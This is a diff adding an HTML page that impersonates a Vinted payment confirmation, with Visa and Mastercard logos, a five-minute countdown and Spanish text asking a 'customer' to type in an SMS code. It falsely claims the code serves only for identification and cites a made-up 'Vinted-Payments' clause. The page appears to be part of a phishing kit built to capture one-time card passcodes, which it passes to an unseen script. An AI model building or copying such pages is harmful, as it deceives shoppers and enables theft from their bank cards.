@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="shortcut icon" href="./images/favicon.png" type="image/x-icon" />
+    <link rel="stylesheet" href="./styles/style.css" />
+    <title>Vinted</title>
+  </head>
+  <body>
+    <header>
+      <div class="logo-main">
+        <a href="https://www.vinted.es/">
+          <img src="./images/logo.svg" alt="" />
+        </a>
+      </div>
+
+      <div class="logos">
+        <a>
+          <img src="./images/visa.svg" alt="" />
+        </a>
+        <a>
+          <img src="./images/mastercard.png" alt="" />
+        </a>
+      </div>
+    </header>
+    <main>
+      <div class="container">
+        <div class="content">
+          <div class="content-title">
+            <p>Confirmacion de Transacction</p>
+          </div>
+
+          <div class="content-photos">
+            <div class="timer-container">
+              <div class="timer">
+                <svg
+                  class="base-timer__svg"
+                  viewBox="0 0 100 100"
+                  xmlns="http://www.w3.org/2000/svg"
+                >
+                  <g class="base-timer__circle">
+                    <circle
+                      class="base-timer__path-elapsed"
+                      cx="50"
+                      cy="50"
+                      r="45"
+                    ></circle>
+                    <path
+                      id="base-timer-path-remaining"
+                      stroke-dasharray="283"
+                      class="base-timer__path-remaining green"
+                      d="
+                          M 50, 50
+                          m -45, 0
+                          a 45,45 0 1,0 90,0
+                          a 45,45 0 1,0 -90,0
+                        "
+                    ></path>
+                  </g>
+                </svg>
+                <span class="timer-value">5:00</span>
+              </div>
+            </div>
+            <a>
+              <img class="mobile" src="./images/mobile.png" alt="" />
+            </a>
+          </div>
+
+          <div class="content-paragraph">
+            <a>
+              Estimado cliente, se ha enviado un mensaje SMS a su teléfono.
+              Ingrese el código recibido en la columna especial. TENGA EN CUENTA
+              que el monto de la identificación no afecta el saldo actual de su
+              tarjeta (según la cláusula 14.1 de las reglas de Vinted-Payments).
+              Esto es necesario únicamente para la identificación del cliente.
+            </a>
+          </div>
+
+          <div class="content-btns">
+            <div class="passcode-input">
+              <input id="input" placeholder="|Passcode|" />
+              <div class="campo">
+                <a
+                  >El campo de introducción del código no debe estar vacío!
+                  Continuar</a
+                >
+              </div>
+            </div>
+
+            <div onclick="handleClick()" class="continuar">
+              <a>Continuar</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </main>
+    <footer>
+      <div>
+        <img src="./images/footer.png" />
+      </div>
+    </footer>
+
+    <script src="./scripts/script.js"></script>
+  </body>
+</html>
